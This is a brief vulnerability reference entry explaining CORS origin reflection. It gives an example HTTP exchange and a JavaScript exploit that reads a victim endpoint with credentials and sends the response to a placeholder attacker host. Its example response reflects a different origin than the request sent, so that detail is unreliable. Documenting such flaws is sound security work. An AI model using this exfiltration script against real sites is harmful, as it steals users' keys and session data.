# Origin Reflection

## Description

Short: Host allows any origin to make requests to it.

Detailed: Blindly reflect the Origin header value in `Access-Control-Allow-Origin headers` in responses, which means any website can read its secrets by sending cross-orign requests.

**Severity**: High

## Exploit 
Make requests from any domain you control.

### Example 
**Vulnerable Implementation** 
```http
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://hacker.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

**Exploit**  
This exploit requires that the respective JS script is hosted at `hacker.com`
```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

[code source](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#vulnerable-example-origin-reflection)
